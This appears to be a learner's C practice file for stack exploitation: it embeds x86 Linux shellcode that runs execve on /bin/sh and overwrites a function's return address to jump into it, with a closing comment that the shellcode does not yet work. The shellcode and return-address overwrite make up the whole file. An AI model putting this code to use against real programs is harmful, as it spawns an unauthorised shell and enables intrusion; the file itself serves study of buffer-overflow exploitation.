#include<stdio.h>

char *shellcode ="\xeb\x14\x5e\x31\xc0\x89\xc1\x89\xc2\x89\xf3\xb0\x0b\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xe7\xff\xff\xff/bin/sh";

void func() {
   int *ret;

   ret = (int)&ret + 8;
   (*ret) = (int)shellcode;
   //(*ret) = (*ret) + 12;

}

void main(){
	func();
	printf("in main after func\n");
	printf("skipped 1 instruction\n");
}

// going to shellcode correctly, problem is in shellcode.
